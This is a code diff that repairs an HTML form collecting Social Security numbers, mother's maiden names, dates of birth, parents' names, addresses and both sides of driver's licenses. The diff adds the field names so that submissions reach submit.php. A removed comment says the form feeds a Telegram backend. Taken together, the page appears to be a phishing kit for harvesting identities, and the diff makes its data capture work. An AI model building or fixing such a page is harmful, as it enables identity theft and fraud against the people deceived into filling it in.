@@ -95,31 +95,6 @@
       font-size:12px;
     }
 
-    .upload-box{
-      border:2px dashed #d0d0d0;
-      padding:35px;
-      text-align:center;
-      background:#fafafa;
-    }
-
-    .upload-box p{
-      color:#666;
-      font-size:16px;
-      margin-bottom:10px;
-      font-weight:bold;
-    }
-
-    .upload-box span{
-      color:#999;
-      font-size:13px;
-    }
-
-    .upload-box input{
-      margin-top:15px;
-      border:none;
-      background:none;
-    }
-
     .submit-area{
       text-align:center;
       margin-top:35px;
@@ -160,138 +135,113 @@
     <img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?q=80&w=1000&auto=format&fit=crop">
   </div>
 
-  <!-- ========================= -->
-  <!-- STEP 1 — FIX FORM TAG -->
-  <!-- This connects form to Telegram backend -->
-  <!-- ========================= -->
-
   <form action="submit.php" method="POST" enctype="multipart/form-data">
 
-          <!-- Name -->
-      <div class="row">
+    <!-- NAME -->
+    <div class="row">
+      <div class="field">
+        <label>First Name <span class="required">*</span></label>
+        <input type="text" name="first_name" required>
+      </div>
 
-        <div class="field">
-          <label>Full Name <span class="required">*</span></label>
-          <input type="text">
-          <div class="small-text">First Name</div>
-        </div>
+      <div class="field">
+        <label>Middle Name</label>
+        <input type="text" name="middle_name">
+      </div>
 
-        <div class="field">
-          <label style="visibility:hidden;">Middle</label>
-          <input type="text">
-          <div class="small-text">Middle Name</div>
-        </div>
-
-        <div class="field">
-          <label style="visibility:hidden;">Last</label>
-          <input type="text">
-          <div class="small-text">Last Name</div>
-        </div>
-        
+      <div class="field">
+        <label>Last Name <span class="required">*</span></label>
+        <input type="text" name="last_name" required>
+      </div>
     </div>
 
     <!-- PHONE + EMAIL -->
     <div class="row">
+      <div class="field">
+        <label>Phone Number <span class="required">*</span></label>
+        <input type="text" name="phone" placeholder="(000) 000-0000" required>
+      </div>
 
       <div class="field">
-          <label>Phone Number <span class="required">*</span></label>
-          <input type="text" placeholder="(000) 000-0000">
-          <div class="small-text">Please enter a valid phone number.</div>
-        </div>
-
-        <div class="field">
-          <label>Email <span class="required">*</span></label>
-          <input type="email">
-          <div class="small-text">example@example.com</div>
-        </div>
-      
+        <label>Email <span class="required">*</span></label>
+        <input type="email" name="email" required>
+      </div>
     </div>
 
     <!-- DOB + MOTHER MAIDEN -->
     <div class="row">
+      <div class="field">
+        <label>Date of Birth <span class="required">*</span></label>
+        <input type="text" name="dob" required>
+      </div>
 
       <div class="field">
-          <label>Date of Birth <span class="required">*</span></label>
-          <input type="text">
-          <div class="small-text">MM/DD/YYYY</div>
+        <label>Mother's Maiden Name</label>
+        <input type="text" name="mother_maiden">
       </div>
-        
-           <div class="field">
-          <label>Mother's Maiden Name <span class="required">*</span></label>
-          <input type="text">
-        </div>
-
     </div>
 
     <!-- SSN + BIRTH CITY -->
     <div class="row">
+      <div class="field">
+        <label>Social Security Number (SSN)</label>
+        <input type="text" name="ssn">
+      </div>
 
-          <div class="field">
-          <label>Social Security Number (SSN) <span class="required">*</span></label>
-          <input type="text">
-        </div>
-
-        <div class="field">
-          <label>City of Birth <span class="required">*</span></label>
-          <input type="text">
-        </div>
-
+      <div class="field">
+        <label>City of Birth</label>
+        <input type="text" name="birth_city">
+      </div>
     </div>
 
     <!-- ADDRESS -->
     <div class="row">
-        <div class="field">
-          <label>Address <span class="required">*</span></label>
-          <input type="text">
-          <div class="small-text">Street Address</div>
-        </div>
+      <div class="field">
+        <label>Address</label>
+        <input type="text" name="address_line1">
       </div>
-
-      <div class="row">
-        <div class="field">
-          <input type="text">
-          <div class="small-text">Street Address Line 2</div>
-        </div>
-      </div>
-
-      <div class="row">
-
-        <div class="field">
-          <input type="text">
-          <div class="small-text">City</div>
-        </div>
-
-        <div class="field">
-          <input type="text">
-          <div class="small-text">State / Province</div>
-        </div>
-
-      </div>
-
-      <div class="row">
-        <div class="field">
-          <input type="text">
-          <div class="small-text">Postal / Zip Code</div>
-        </div>
     </div>
 
-          <!-- Father + Mother (FIXED AND SEPARATED) -->
-      <div class="row">
-
-        <div class="field">
-          <label>Father's Full Name <span class="required">*</span></label>
-          <input type="text">
-          <div class="small-text">First/Middle/Last Name</div>
-        </div>
-
-        <div class="field">
-          <label>Mother's Full Name <span class="required">*</span></label>
-          <input type="text">
-          <div class="small-text">First/Middle/Last Name</div>
-            </div>
+    <div class="row">
+      <div class="field">
+        <input type="text" name="address_line2">
+        <div class="small-text">Street Address Line 2</div>
+      </div>
     </div>
 
-    <!-- FRONT ID -->
+    <div class="row">
+      <div class="field">
+        <input type="text" name="city">
+        <div class="small-text">City</div>
+      </div>
+
+      <div class="field">
+        <input type="text" name="state">
+        <div class="small-text">State / Province</div>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="field">
+        <input type="text" name="zip_code">
+        <div class="small-text">Postal / Zip Code</div>
+      </div>
+    </div>
+
+    <!-- PARENTS -->
+    <div class="row">
+      <div class="field">
+        <label>Father's Full Name</label>
+        <input type="text" name="father_name">
+      </div>
+
+      <div class="field">
+        <label>Mother's Full Name</label>
+        <input type="text" name="mother_name">
+      </div>
+    </div>
+
+    <!-- FILES -->
     <div class="row">
       <div class="field">
         <label>Front Copy of Driver's License</label>
@@ -299,7 +249,6 @@
       </div>
     </div>
 
-    <!-- BACK ID -->
     <div class="row">
       <div class="field">
         <label>Back Copy of Driver's License</label>
@@ -318,4 +267,4 @@
 </div>
 
 </body>
-</html>
+  </html>
